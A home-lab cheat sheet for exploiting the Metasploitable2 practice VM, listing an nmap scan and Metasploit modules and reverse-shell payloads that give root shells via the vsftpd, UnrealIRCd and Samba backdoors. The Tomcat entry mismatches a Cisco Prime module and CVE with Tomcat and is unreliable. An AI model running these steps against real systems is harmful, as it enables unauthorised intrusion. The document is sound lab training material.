## 🧠 Home Lab Cheat Sheet

### Target: Metasploitable2  
> IP: `192.168.138.130` (your lab — change if needed)

---

### How to Identify Services
```bash
nmap -sV 192.168.138.130
```
Look for open ports + service versions to match known exploits.

**nmap scan:**
![Shell Gained](../screenshots/nmap_scan.png)
---

### Common Metasploit Steps
```bash
use <exploit/module/path>
set RHOST <target IP>
set RPORT <target port>
set LHOST <Kali IP>
set PAYLOAD <payload>     # if needed
run
```

---

### PORT 21 – FTP
- **Service:** vsftpd 2.3.4  
- **Exploit Module:** `exploit/unix/ftp/vsftpd_234_backdoor`  
- **Payload:** None needed (built-in command shell)  
- **Notes:**
  - Opens a root shell backdoor on port 6200
  - Triggered by logging in with a `:)` in the username
- **Result:** `root`  
- **CVE:** [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)  

---

### PORT 6667 – IRC
- **Service:** UnrealIRCd 3.2.8.1  
- **Exploit Module:** `exploit/unix/irc/unreal_ircd_3281_backdoor`  
- **Payload:** `cmd/unix/reverse`  
- **Options to Set:**
  ```bash
  set RHOST <target IP>
  set RPORT 6667
  set LHOST <Kali IP>
  ```
- **Result:** Reverse shell as `root`  
- **CVE:** [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)

---

### PORT 445 – Samba
- **Service:** Samba
- **Exploit Module:** `exploit/unix/samba/usermap_script`  
- **Payload:** `cmd/unix/reverse_netcat`  
- **Options to Set:**
  ```bash
  set RHOST <target IP>
  set RPORT 445
  set LHOST <Kali IP>
  ```
- **Result:** Reverse shell as `root`  
- **CVE:** [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)

---

### PORT 8180 – Apache Tomcat
- **Service:** Apache Tomcat
- **Exploit Module:** `exploit/unix/http/cisco_prime_inf_rce`  
- **Payload:** `linux/x64/meterpreter/reverse_tcp`  
- **Options to Set:**
  ```bash
  set RHOST <target IP>
  set RPORT 8180
  set LHOST <Kali IP>
  ```
- **Result:** Exploit completed but no session created, requires **manual placement of JSP payload** in `/opt/CSCOlumos` 
- **CVE:** [CVE-2018-15379](https://nvd.nist.gov/vuln/detail/CVE-2018-15379)

---

### Tips
- Always `nmap` first to find the right service version.
- Use `search <service/version>` in Metasploit to find modules.
- If it says “no payload selected,” choose one based on OS.
- If you get "no session created," check:
  - LHOST is correct
  - Firewall is off
  - Port actually open
